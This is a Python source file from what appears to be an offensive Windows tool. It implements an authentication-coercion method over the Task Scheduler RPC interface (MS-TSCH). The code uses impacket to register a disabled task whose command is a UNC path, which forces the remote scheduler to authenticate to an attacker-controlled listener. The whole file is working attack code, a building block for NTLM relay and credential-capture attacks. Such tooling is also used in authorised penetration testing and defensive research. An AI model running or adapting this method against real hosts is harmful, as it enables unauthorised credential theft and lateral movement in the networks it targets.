"""MS-TSCH (Task Scheduler Service) coercion methods.

Coerces authentication by registering a task with a UNC path,
forcing the scheduler to validate/access the remote path.
"""

from __future__ import annotations

from impacket.dcerpc.v5 import tsch
from impacket.dcerpc.v5.dtypes import NULL

from coercex.methods.base import CoercionMethod, PipeBinding
from coercex.net import random_string

TSCH_UUID = "86d35949-83c9-4044-b424-db363231fd0c"

TSCH_PIPES = [
    PipeBinding(pipe=r"\PIPE\atsvc", uuid=TSCH_UUID, version="1.0"),
]

TSCH_PATH_STYLES = [
    ("smb", "share_file"),
    ("http", "share_file"),
]

PROTOCOL_SHORT = "MS-TSCH"
PROTOCOL_LONG = "[MS-TSCH]: Task Scheduler Service Remoting Protocol"

# Task XML template that references a UNC path in the command
TASK_XML_TEMPLATE = r"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>{description}</Description>
  </RegistrationInfo>
  <Triggers>
    <TimeTrigger>
      <StartBoundary>2099-01-01T00:00:00</StartBoundary>
      <Enabled>false</Enabled>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Actions Context="Author">
    <Exec>
      <Command>{unc_path}</Command>
    </Exec>
  </Actions>
</Task>"""


def _trigger_register_task(dce, path, target):
    """SchRpcRegisterTask - register a task with a UNC command path.

    The scheduler validates the command path, triggering auth to our listener.
    The task is set to never actually run (trigger in 2099, disabled).
    """
    clean_path = path.rstrip("\x00")
    task_name = f"\\{random_string(12)}"
    task_xml = TASK_XML_TEMPLATE.format(
        description=random_string(8),
        unc_path=clean_path,
    )
    tsch.hSchRpcRegisterTask(
        dce,
        task_name,
        task_xml,
        tsch.TASK_CREATE | tsch.TASK_DONT_ADD_PRINCIPAL_ACE,
        NULL,
        tsch.TASK_LOGON_NONE,
    )


def get_methods() -> list[CoercionMethod]:
    """Return all MS-TSCH coercion methods."""
    return [
        CoercionMethod(
            protocol_short=PROTOCOL_SHORT,
            protocol_long=PROTOCOL_LONG,
            function_name="SchRpcRegisterTask",
            opnum=1,
            vuln_args=["Command (UNC path in task XML)"],
            pipe_bindings=list(TSCH_PIPES),
            path_styles=list(TSCH_PATH_STYLES),
            trigger_fn=_trigger_register_task,
            priority=7,  # Task Scheduler - rarely vulnerable
        ),
    ]
